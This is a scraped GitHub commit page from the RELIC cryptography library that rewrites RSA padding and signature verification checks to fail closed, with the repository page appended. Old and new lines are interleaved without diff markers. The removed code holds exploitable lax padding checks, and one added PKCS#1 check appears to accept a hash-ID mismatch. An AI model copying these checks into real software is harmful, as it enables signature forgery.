  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  + [Nonprofits](/solutions/industry/nonprofits)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Frelic-toolkit%2Frelic%2Fcommit%2F76c9a1fdf19d9e92e566a77376673e522aae9f80)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fvoltron%2Fcommit_fragments%2Frepo_layout&source=header-repo&source_repo=relic-toolkit%2Frelic)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[relic-toolkit](/relic-toolkit)
/
**[relic](/relic-toolkit/relic)**
Public

* [Notifications](/login?return_to=%2Frelic-toolkit%2Frelic) You must be signed in to change notification settings
* [Fork
  180](/login?return_to=%2Frelic-toolkit%2Frelic)
* [Star
   468](/login?return_to=%2Frelic-toolkit%2Frelic)

* [Code](/relic-toolkit/relic)
* [Issues
  9](/relic-toolkit/relic/issues)
* [Pull requests
  2](/relic-toolkit/relic/pulls)
* [Actions](/relic-toolkit/relic/actions)
* [Projects
  0](/relic-toolkit/relic/projects)
* [Wiki](/relic-toolkit/relic/wiki)
* [Security](/relic-toolkit/relic/security)
* [Insights](/relic-toolkit/relic/pulse)

Additional navigation options

* [Code](/relic-toolkit/relic)
* [Issues](/relic-toolkit/relic/issues)
* [Pull requests](/relic-toolkit/relic/pulls)
* [Actions](/relic-toolkit/relic/actions)
* [Projects](/relic-toolkit/relic/projects)
* [Wiki](/relic-toolkit/relic/wiki)
* [Security](/relic-toolkit/relic/security)
* [Insights](/relic-toolkit/relic/pulse)

## Commit

[Permalink](/relic-toolkit/relic/commit/76c9a1fdf19d9e92e566a77376673e522aae9f80)

This commit does not belong to any branch on this repository, and may belong to a fork outside of the repository.

Fix [#154](https://github.com/relic-toolkit/relic/issues/154) and [#155](https://github.com/relic-toolkit/relic/issues/155) by inverting the padding check logic and being moreâ¦

[Browse files](/relic-toolkit/relic/tree/76c9a1fdf19d9e92e566a77376673e522aae9f80)
Browse the repository at this point in the history

```
â¦ rigorous.
```

* Loading branch information

[![@dfaranha](https://avatars.githubusercontent.com/u/5369810?s=40&v=4)](/dfaranha)

[dfaranha](/relic-toolkit/relic/commits?author=dfaranha "View all commits by dfaranha")
committed
Aug 1, 2020

1 parent
[965ff62](/relic-toolkit/relic/commit/965ff629b2f6bd98a3bc8150e1d967875bfe4adc)

commit 76c9a1f

Showing
**1 changed file**
with
**117 additions**
and
**117 deletions**.

* Whitespace
* Ignore whitespace

* Split
* Unified

## There are no files selected for viewing

234 changes: 117 additions & 117 deletions

234
[src/cp/relic\_cp\_rsa.c](#diff-8a011e89a73b34c4c1bb03565f413e30c5f41e311ccc5e4ae937a3d3166ba93b "src/cp/relic_cp_rsa.c")

Show comments

[View file](/relic-toolkit/relic/blob/76c9a1fdf19d9e92e566a77376673e522aae9f80/src/cp/relic_cp_rsa.c)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -129,7 +129,7 @@ |
|  |  | \*/ |
|  |  | static int pad\_basic(bn\_t m, int \*p\_len, int m\_len, int k\_len, int operation) { |
|  |  | uint8\_t pad = 0; |
|  |  | int result = RLC\_OK; |
|  |  | int result = RLC\_ERR; |
|  |  | bn\_t t; |
|  |  |  |
|  |  | RLC\_TRY { |
| Expand All | | @@ -146,27 +146,27 @@ static int pad\_basic(bn\_t m, int \*p\_len, int m\_len, int k\_len, int operation) { |
|  |  | bn\_add\_dig(m, m, RSA\_PAD); |
|  |  | /\* Make room for the real message. \*/ |
|  |  | bn\_lsh(m, m, m\_len \* 8); |
|  |  | result = RLC\_OK; |
|  |  | break; |
|  |  | case RSA\_DEC: |
|  |  | case RSA\_VER: |
|  |  | case RSA\_VER\_HASH: |
|  |  | /\* EB = 00 | FF | D. \*/ |
|  |  | m\_len = k\_len - 1; |
|  |  | bn\_rsh(t, m, 8 \* m\_len); |
|  |  | if (!bn\_is\_zero(t)) { |
|  |  | result = RLC\_ERR; |
|  |  | } |
|  |  | \*p\_len = 1; |
|  |  | do { |
|  |  | (\*p\_len)++; |
|  |  | m\_len--; |
|  |  | bn\_rsh(t, m, 8 \* m\_len); |
|  |  | pad = (uint8\_t)t->dp[0]; |
|  |  | } while (pad == 0 && m\_len > 0); |
|  |  | if (pad != RSA\_PAD) { |
|  |  | result = RLC\_ERR; |
|  |  | if (bn\_is\_zero(t)) { |
|  |  | \*p\_len = 1; |
|  |  | do { |
|  |  | (\*p\_len)++; |
|  |  | m\_len--; |
|  |  | bn\_rsh(t, m, 8 \* m\_len); |
|  |  | pad = (uint8\_t)t->dp[0]; |
|  |  | } while (pad == 0 && m\_len > 0); |
|  |  | if (pad == RSA\_PAD) { |
|  |  | result = RLC\_OK; |
|  |  | } |
|  |  | bn\_mod\_2b(m, m, (k\_len - \*p\_len) \* 8); |
|  |  | } |
|  |  | bn\_mod\_2b(m, m, (k\_len - \*p\_len) \* 8); |
|  |  | break; |
|  |  | } |
|  |  | } |
| Expand Down  Expand Up | | @@ -251,7 +251,7 @@ static uint8\_t \*hash\_id(int md, int \*len) { |
|  |  | \*/ |
|  |  | static int pad\_pkcs1(bn\_t m, int \*p\_len, int m\_len, int k\_len, int operation) { |
|  |  | uint8\_t \*id, pad = 0; |
|  |  | int len, result = RLC\_OK; |
|  |  | int len, result = RLC\_ERR; |
|  |  | bn\_t t; |
|  |  |  |
|  |  | bn\_null(t); |
| Expand All | | @@ -278,29 +278,28 @@ static int pad\_pkcs1(bn\_t m, int \*p\_len, int m\_len, int k\_len, int operation) { |
|  |  | bn\_add\_dig(m, m, 0); |
|  |  | /\* Make room for the real message. \*/ |
|  |  | bn\_lsh(m, m, m\_len \* 8); |
|  |  | result = RLC\_OK; |
|  |  | break; |
|  |  | case RSA\_DEC: |
|  |  | m\_len = k\_len - 1; |
|  |  | bn\_rsh(t, m, 8 \* m\_len); |
|  |  | if (!bn\_is\_zero(t)) { |
|  |  | result = RLC\_ERR; |
|  |  | } |
|  |  |  |
|  |  | \*p\_len = m\_len; |
|  |  | m\_len--; |
|  |  | bn\_rsh(t, m, 8 \* m\_len); |
|  |  | pad = (uint8\_t)t->dp[0]; |
|  |  | if (pad != RSA\_PUB) { |
|  |  | result = RLC\_ERR; |
|  |  | } |
|  |  | do { |
|  |  | if (bn\_is\_zero(t)) { |
|  |  | \*p\_len = m\_len; |
|  |  | m\_len--; |
|  |  | bn\_rsh(t, m, 8 \* m\_len); |
|  |  | pad = (uint8\_t)t->dp[0]; |
|  |  | } while (pad != 0 && m\_len > 0); |
|  |  | /\* Remove padding and trailing zero. \*/ |
|  |  | \*p\_len -= (m\_len - 1); |
|  |  | bn\_mod\_2b(m, m, (k\_len - \*p\_len) \* 8); |
|  |  | if (pad == RSA\_PUB) { |
|  |  | do { |
|  |  | m\_len--; |
|  |  | bn\_rsh(t, m, 8 \* m\_len); |
|  |  | pad = (uint8\_t)t->dp[0]; |
|  |  | } while (pad != 0 && m\_len > 0); |
|  |  | /\* Remove padding and trailing zero. \*/ |
|  |  | \*p\_len -= (m\_len - 1); |
|  |  | bn\_mod\_2b(m, m, (k\_len - \*p\_len) \* 8); |
|  |  | result = (m\_len > 0 ? RLC\_OK : RLC\_ERR); |
|  |  | } |
|  |  | } |
|  |  | break; |
|  |  | case RSA\_SIG: |
|  |  | /\* EB = 00 | 01 | PS | 00 | D. \*/ |
| Expand All | | @@ -321,6 +320,7 @@ static int pad\_pkcs1(bn\_t m, int \*p\_len, int m\_len, int k\_len, int operation) { |
|  |  | bn\_add(m, m, t); |
|  |  | /\* Make room for the real message. \*/ |
|  |  | bn\_lsh(m, m, m\_len \* 8); |
|  |  | result = RLC\_OK; |
|  |  | break; |
|  |  | case RSA\_SIG\_HASH: |
|  |  | /\* EB = 00 | 01 | PS | 00 | D. \*/ |
| Expand All | | @@ -337,65 +337,65 @@ static int pad\_pkcs1(bn\_t m, int \*p\_len, int m\_len, int k\_len, int operation) { |
|  |  | bn\_add\_dig(m, m, 0); |
|  |  | /\* Make room for the real message. \*/ |
|  |  | bn\_lsh(m, m, m\_len \* 8); |
|  |  | result = RLC\_OK; |
|  |  | break; |
|  |  | case RSA\_VER: |
|  |  | m\_len = k\_len - 1; |
|  |  | bn\_rsh(t, m, 8 \* m\_len); |
|  |  | if (!bn\_is\_zero(t)) { |
|  |  | result = RLC\_ERR; |
|  |  | } |
|  |  | m\_len--; |
|  |  | bn\_rsh(t, m, 8 \* m\_len); |
|  |  | pad = (uint8\_t)t->dp[0]; |
|  |  | if (pad != RSA\_PRV) { |
|  |  | result = RLC\_ERR; |
|  |  | } |
|  |  | do { |
|  |  | if (bn\_is\_zero(t)) { |
|  |  | m\_len--; |
|  |  | bn\_rsh(t, m, 8 \* m\_len); |
|  |  | pad = (uint8\_t)t->dp[0]; |
|  |  | } while (pad != 0 && m\_len > 0); |
|  |  | if (m\_len == 0) { |
|  |  | result = RLC\_ERR; |
|  |  | } |
|  |  | /\* Remove padding and trailing zero. \*/ |
|  |  | id = hash\_id(MD\_MAP, &len); |
|  |  | m\_len -= len; |
|  |  |  |
|  |  | bn\_rsh(t, m, m\_len \* 8); |
|  |  | int r = 0; |
|  |  | for (int i = 0; i < len; i++) { |
|  |  | pad = (uint8\_t)t->dp[0]; |
|  |  | r |= pad - id[len - i - 1]; |
|  |  | bn\_rsh(t, t, 8); |
|  |  | if (pad == RSA\_PRV) { |
|  |  | int counter = 0; |
|  |  | do { |
|  |  | counter++; |
|  |  | m\_len--; |
|  |  | bn\_rsh(t, m, 8 \* m\_len); |
|  |  | pad = (uint8\_t)t->dp[0]; |
|  |  | } while (pad == RSA\_PAD && m\_len > 0); |
|  |  | /\* Remove padding and trailing zero. \*/ |
|  |  | id = hash\_id(MD\_MAP, &len); |
|  |  | m\_len -= len; |
|  |  |  |
|  |  | bn\_rsh(t, m, m\_len \* 8); |
|  |  | int r = 0; |
|  |  | for (int i = 0; i < len; i++) { |
|  |  | pad = (uint8\_t)t->dp[0]; |
|  |  | r |= pad ^ id[len - i - 1]; |
|  |  | bn\_rsh(t, t, 8); |
|  |  | } |
|  |  | \*p\_len = k\_len - m\_len; |
|  |  | bn\_mod\_2b(m, m, m\_len \* 8); |
|  |  | if (r && m\_len > 0 && counter >= 8) { |
|  |  | result = RLC\_OK; |
|  |  | } |
|  |  | } |
|  |  | } |
|  |  | \*p\_len = k\_len - m\_len; |
|  |  | bn\_mod\_2b(m, m, m\_len \* 8); |
|  |  | result = (r == 0 ? RLC\_OK : RLC\_ERR); |
|  |  | break; |
|  |  | case RSA\_VER\_HASH: |
|  |  | m\_len = k\_len - 1; |
|  |  | bn\_rsh(t, m, 8 \* m\_len); |
|  |  | if (!bn\_is\_zero(t)) { |
|  |  | result = RLC\_ERR; |
|  |  | } |
|  |  | m\_len--; |
|  |  | bn\_rsh(t, m, 8 \* m\_len); |
|  |  | pad = (uint8\_t)t->dp[0]; |
|  |  | if (pad != RSA\_PRV) { |
|  |  | result = RLC\_ERR; |
|  |  | } |
|  |  | do { |
|  |  | if (bn\_is\_zero(t)) { |
|  |  | m\_len--; |
|  |  | bn\_rsh(t, m, 8 \* m\_len); |
|  |  | pad = (uint8\_t)t->dp[0]; |
|  |  | } while (pad != 0 && m\_len > 0); |
|  |  | if (m\_len == 0) { |
|  |  | result = RLC\_ERR; |
|  |  | if (pad == RSA\_PRV) { |
|  |  | int counter = 0; |
|  |  | do { |
|  |  | counter++; |
|  |  | m\_len--; |
|  |  | bn\_rsh(t, m, 8 \* m\_len); |
|  |  | pad = (uint8\_t)t->dp[0]; |
|  |  | } while (pad == RSA\_PAD && m\_len > 0); |
|  |  | /\* Remove padding and trailing zero. \*/ |
|  |  | \*p\_len = k\_len - m\_len; |
|  |  | bn\_mod\_2b(m, m, m\_len \* 8); |
|  |  | if (m\_len > 0 && counter >= 8) { |
|  |  | result = RLC\_OK; |
|  |  | } |
|  |  | } |
|  |  | } |
|  |  | /\* Remove padding and trailing zero. \*/ |
|  |  | \*p\_len = k\_len - m\_len; |
|  |  | bn\_mod\_2b(m, m, m\_len \* 8); |
|  |  | break; |
|  |  | } |
|  |  | } |
| Expand Down  Expand Up | | @@ -426,7 +426,7 @@ static int pad\_pkcs2(bn\_t m, int \*p\_len, int m\_len, int k\_len, int operation) { |
|  |  | uint8\_t pad, h1[RLC\_MD\_LEN], h2[RLC\_MD\_LEN]; |
|  |  | /\* MSVC does not allow dynamic stack arrays \*/ |
|  |  | uint8\_t \*mask = RLC\_ALLOCA(uint8\_t, k\_len); |
|  |  | int result = RLC\_OK; |
|  |  | int result = RLC\_ERR; |
|  |  | bn\_t t; |
|  |  |  |
|  |  | bn\_null(t); |
| Expand All | | @@ -445,6 +445,7 @@ static int pad\_pkcs2(bn\_t m, int \*p\_len, int m\_len, int k\_len, int operation) { |
|  |  | bn\_add\_dig(m, m, 0x01); |
|  |  | /\* Make room for the real message. \*/ |
|  |  | bn\_lsh(m, m, m\_len \* 8); |
|  |  | result = RLC\_OK; |
|  |  | break; |
|  |  | case RSA\_ENC\_FIN: |
|  |  | /\* EB = 00 | maskedSeed | maskedDB. \*/ |
| Expand All | | @@ -463,47 +464,44 @@ static int pad\_pkcs2(bn\_t m, int \*p\_len, int m\_len, int k\_len, int operation) { |
|  |  | bn\_lsh(t, t, 8 \* (k\_len - RLC\_MD\_LEN - 1)); |
|  |  | bn\_add(t, t, m); |
|  |  | bn\_copy(m, t); |
|  |  | result = RLC\_OK; |
|  |  | break; |
|  |  | case RSA\_DEC: |
|  |  | m\_len = k\_len - 1; |
|  |  | bn\_rsh(t, m, 8 \* m\_len); |
|  |  | if (!bn\_is\_zero(t)) { |
|  |  | result = RLC\_ERR; |
|  |  | } |
|  |  | m\_len -= RLC\_MD\_LEN; |
|  |  | bn\_rsh(t, m, 8 \* m\_len); |
|  |  | bn\_write\_bin(h1, RLC\_MD\_LEN, t); |
|  |  | bn\_mod\_2b(m, m, 8 \* m\_len); |
|  |  | bn\_write\_bin(mask, m\_len, m); |
|  |  | md\_mgf(h2, RLC\_MD\_LEN, mask, m\_len); |
|  |  | for (int i = 0; i < RLC\_MD\_LEN; i++) { |
|  |  | h1[i] ^= h2[i]; |
|  |  | } |
|  |  | md\_mgf(mask, k\_len - RLC\_MD\_LEN - 1, h1, RLC\_MD\_LEN); |
|  |  | bn\_read\_bin(t, mask, k\_len - RLC\_MD\_LEN - 1); |
|  |  | for (int i = 0; i < t->used; i++) { |
|  |  | m->dp[i] ^= t->dp[i]; |
|  |  | } |
|  |  | m\_len -= RLC\_MD\_LEN; |
|  |  | bn\_rsh(t, m, 8 \* m\_len); |
|  |  | bn\_write\_bin(h2, RLC\_MD\_LEN, t); |
|  |  | md\_map(h1, NULL, 0); |
|  |  | pad = 0; |
|  |  | for (int i = 0; i < RLC\_MD\_LEN; i++) { |
|  |  | pad |= h1[i] - h2[i]; |
|  |  | } |
|  |  | if (result == RLC\_OK) { |
|  |  | result = (pad ? RLC\_ERR : RLC\_OK); |
|  |  | } |
|  |  | bn\_mod\_2b(m, m, 8 \* m\_len); |
|  |  | \*p\_len = bn\_size\_bin(m); |
|  |  | (\*p\_len)--; |
|  |  | bn\_rsh(t, m, \*p\_len \* 8); |
|  |  | if (bn\_cmp\_dig(t, 1) != RLC\_EQ) { |
|  |  | result = RLC\_ERR; |
|  |  | if (bn\_is\_zero(t)) { |
|  |  | m\_len -= RLC\_MD\_LEN; |
|  |  | bn\_rsh(t, m, 8 \* m\_len); |
|  |  | bn\_write\_bin(h1, RLC\_MD\_LEN, t); |
|  |  | bn\_mod\_2b(m, m, 8 \* m\_len); |
|  |  | bn\_write\_bin(mask, m\_len, m); |
|  |  | md\_mgf(h2, RLC\_MD\_LEN, mask, m\_len); |
|  |  | for (int i = 0; i < RLC\_MD\_LEN; i++) { |
|  |  | h1[i] ^= h2[i]; |
|  |  | } |
|  |  | md\_mgf(mask, k\_len - RLC\_MD\_LEN - 1, h1, RLC\_MD\_LEN); |
|  |  | bn\_read\_bin(t, mask, k\_len - RLC\_MD\_LEN - 1); |
|  |  | for (int i = 0; i < t->used; i++) { |
|  |  | m->dp[i] ^= t->dp[i]; |
|  |  | } |
|  |  | m\_len -= RLC\_MD\_LEN; |
|  |  | bn\_rsh(t, m, 8 \* m\_len); |
|  |  | bn\_write\_bin(h2, RLC\_MD\_LEN, t); |
|  |  | md\_map(h1, NULL, 0); |
|  |  | pad = 0; |
|  |  | for (int i = 0; i < RLC\_MD\_LEN; i++) { |
|  |  | pad |= h1[i] ^ h2[i]; |
|  |  | } |
|  |  | bn\_mod\_2b(m, m, 8 \* m\_len); |
|  |  | \*p\_len = bn\_size\_bin(m); |
|  |  | (\*p\_len)--; |
|  |  | bn\_rsh(t, m, \*p\_len \* 8); |
|  |  | if (pad == 0 && bn\_cmp\_dig(t, 1) == RLC\_EQ) { |
|  |  | result = RLC\_OK; |
|  |  | } |
|  |  | bn\_mod\_2b(m, m, \*p\_len \* 8); |
|  |  | \*p\_len = k\_len - \*p\_len; |
|  |  | } |
|  |  | bn\_mod\_2b(m, m, \*p\_len \* 8); |
|  |  | \*p\_len = k\_len - \*p\_len; |
|  |  | break; |
|  |  | case RSA\_SIG: |
|  |  | case RSA\_SIG\_HASH: |
| Expand All | | @@ -512,6 +510,7 @@ static int pad\_pkcs2(bn\_t m, int \*p\_len, int m\_len, int k\_len, int operation) { |
|  |  | bn\_lsh(m, m, 64); |
|  |  | /\* Make room for the real message. \*/ |
|  |  | bn\_lsh(m, m, RLC\_MD\_LEN \* 8); |
|  |  | result = RLC\_OK; |
|  |  | break; |
|  |  | case RSA\_SIG\_FIN: |
|  |  | memset(mask, 0, 8); |
| Expand All | | @@ -529,16 +528,17 @@ static int pad\_pkcs2(bn\_t m, int \*p\_len, int m\_len, int k\_len, int operation) { |
|  |  | for (int i = m\_len - 1; i < 8 \* k\_len; i++) { |
|  |  | bn\_set\_bit(m, i, 0); |
|  |  | } |
|  |  | result = RLC\_OK; |
|  |  | break; |
|  |  | case RSA\_VER: |
|  |  | case RSA\_VER\_HASH: |
|  |  | bn\_mod\_2b(t, m, 8); |
|  |  | if (bn\_cmp\_dig(t, RSA\_PSS) != RLC\_EQ) { |
|  |  | result = RLC\_ERR; |
|  |  | } else { |
|  |  | pad = (uint8\_t)t->dp[0]; |
|  |  | if (pad == RSA\_PSS) { |
|  |  | int r = 1; |
|  |  | for (int i = m\_len; i < 8 \* k\_len; i++) { |
|  |  | if (bn\_get\_bit(m, i) != 0) { |
|  |  | result = RLC\_ERR; |
|  |  | r = 0; |
|  |  | } |
|  |  | } |
|  |  | bn\_rsh(m, m, 8); |
| Expand All | | @@ -555,8 +555,8 @@ static int pad\_pkcs2(bn\_t m, int \*p\_len, int m\_len, int k\_len, int operation) { |
|  |  | for (int i = m\_len - 1; i < 8 \* k\_len; i++) { |
|  |  | bn\_set\_bit(m, i - ((RLC\_MD\_LEN + 1) \* 8), 0); |
|  |  | } |
|  |  | if (!bn\_is\_zero(m)) { |
|  |  | result = RLC\_ERR; |
|  |  | if (r == 1 && bn\_is\_zero(m)) { |
|  |  | result = RLC\_OK; |
|  |  | } |
|  |  | bn\_read\_bin(m, h2, RLC\_MD\_LEN); |
|  |  | \*p\_len = k\_len - RLC\_MD\_LEN; |
| Expand Down | |  |

Toggle all file notes
Toggle all file annotations

### 0 comments on commit `76c9a1f`

Please
[sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Frelic-toolkit%2Frelic%2Fcommit%2F76c9a1fdf19d9e92e566a77376673e522aae9f80) to comment.

## Footer

Â© 2025 GitHub,Â Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You canât perform that action at this time.



=== Content from github.com_ce9ea860_20250119_112027.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Frelic-toolkit%2Frelic%2F)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  + [Nonprofits](/solutions/industry/nonprofits)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Frelic-toolkit%2Frelic%2F)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E&source=header-repo&source_repo=relic-toolkit%2Frelic)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[relic-toolkit](/relic-toolkit)
/
**[relic](/relic-toolkit/relic)**
Public

* [Notifications](/login?return_to=%2Frelic-toolkit%2Frelic) You must be signed in to change notification settings
* [Fork
  180](/login?return_to=%2Frelic-toolkit%2Frelic)
* [Star
   468](/login?return_to=%2Frelic-toolkit%2Frelic)

Code

### License

[View license](/relic-toolkit/relic/blob/main/LICENSE)

[468
stars](/relic-toolkit/relic/stargazers) [180
forks](/relic-toolkit/relic/forks) [Branches](/relic-toolkit/relic/branches) [Tags](/relic-toolkit/relic/tags) [Activity](/relic-toolkit/relic/activity)
 [Star](/login?return_to=%2Frelic-toolkit%2Frelic)

 [Notifications](/login?return_to=%2Frelic-toolkit%2Frelic) You must be signed in to change notification settings

* [Code](/relic-toolkit/relic)
* [Issues
  9](/relic-toolkit/relic/issues)
* [Pull requests
  2](/relic-toolkit/relic/pulls)
* [Actions](/relic-toolkit/relic/actions)
* [Projects
  0](/relic-toolkit/relic/projects)
* [Wiki](/relic-toolkit/relic/wiki)
* [Security](/relic-toolkit/relic/security)
* [Insights](/relic-toolkit/relic/pulse)

Additional navigation options

* [Code](/relic-toolkit/relic)
* [Issues](/relic-toolkit/relic/issues)
* [Pull requests](/relic-toolkit/relic/pulls)
* [Actions](/relic-toolkit/relic/actions)
* [Projects](/relic-toolkit/relic/projects)
* [Wiki](/relic-toolkit/relic/wiki)
* [Security](/relic-toolkit/relic/security)
* [Insights](/relic-toolkit/relic/pulse)

# relic-toolkit/relic

   Â main[Branches](/relic-toolkit/relic/branches)[Tags](/relic-toolkit/relic/tags)Go to fileCode
## Folders and files

| Name | | Name | Last commit message | Last commit date |
| --- | --- | --- | --- | --- |
| Latest commitÂ History[4,234 Commits](/relic-toolkit/relic/commits/main/) | | |
| [.github/workflows](/relic-toolkit/relic/tree/main/.github/workflows "This path skips through empty directories") | | [.github/workflows](/relic-toolkit/relic/tree/main/.github/workflows "This path skips through empty directories") |  |  |
| [art](/relic-toolkit/relic/tree/main/art "art") | | [art](/relic-toolkit/relic/tree/main/art "art") |  |  |
| [bench](/relic-toolkit/relic/tree/main/bench "bench") | | [bench](/relic-toolkit/relic/tree/main/bench "bench") |  |  |
| [cmake](/relic-toolkit/relic/tree/main/cmake "cmake") | | [cmake](/relic-toolkit/relic/tree/main/cmake "cmake") |  |  |
| [demo](/relic-toolkit/relic/tree/main/demo "demo") | | [demo](/relic-toolkit/relic/tree/main/demo "demo") |  |  |
| [doc](/relic-toolkit/relic/tree/main/doc "doc") | | [doc](/relic-toolkit/relic/tree/main/doc "doc") |  |  |
| [include](/relic-toolkit/relic/tree/main/include "include") | | [include](/relic-toolkit/relic/tree/main/include "include") |  |  |
| [preset](/relic-toolkit/relic/tree/main/preset "preset") | | [preset](/relic-toolkit/relic/tree/main/preset "preset") |  |  |
| [src](/relic-toolkit/relic/tree/main/src "src") | | [src](/relic-toolkit/relic/tree/main/src "src") |  |  |
| [test](/relic-toolkit/relic/tree/main/test "test") | | [test](/relic-toolkit/relic/tree/main/test "test") |  |  |
| [tools](/relic-toolkit/relic/tree/main/tools "tools") | | [tools](/relic-toolkit/relic/tree/main/tools "tools") |  |  |
| [.editorconfig](/relic-toolkit/relic/blob/main/.editorconfig ".editorconfig") | | [.editorconfig](/relic-toolkit/relic/blob/main/.editorconfig ".editorconfig") |  |  |
| [.gitignore](/relic-toolkit/relic/blob/main/.gitignore ".gitignore") | | [.gitignore](/relic-toolkit/relic/blob/main/.gitignore ".gitignore") |  |  |
